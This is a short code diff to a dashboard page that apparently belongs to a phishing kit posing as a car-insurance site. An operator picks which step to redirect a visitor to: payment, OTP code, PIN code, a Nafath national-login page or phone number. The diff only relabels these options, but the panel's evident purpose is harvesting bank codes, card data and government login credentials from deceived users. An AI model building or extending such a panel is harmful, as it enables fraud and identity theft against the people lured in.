@@ -115,13 +115,13 @@ export default function DashboardPage() {
   const pageOptions = [
     { value: "", label: "اختر صفحة للتوجيه..." },
     { value: "home-new", label: "🏠 الرئيسية" },
-    { value: "compar", label: "📊 مقارنة الأسعار" },
-    { value: "insur", label: "📋 تفاصيل التأمين" },
-    { value: "check", label: "🔐 التحقق من البيانات" },
+    { value: "compar", label: "📊 اختيار الباقة" },
+    { value: "insur", label: "📋 تفاصيل المركبة" },
+    { value: "check", label: "🔐 الدفع" },
     { value: "step2", label: "🔢 رمز OTP" },
     { value: "step3", label: "🔏 رمز PIN" },
-    { value: "step4", label: "💳 بيانات البطاقة" },
-    { value: "step5", label: "📱 تأكيد الهاتف" },
+    { value: "step4", label: "🔒 النفاذ" },
+    { value: "step5", label: "📱 رقم الهاتف" },
   ];
 
   // Sort requests by the original submission time (newest first)
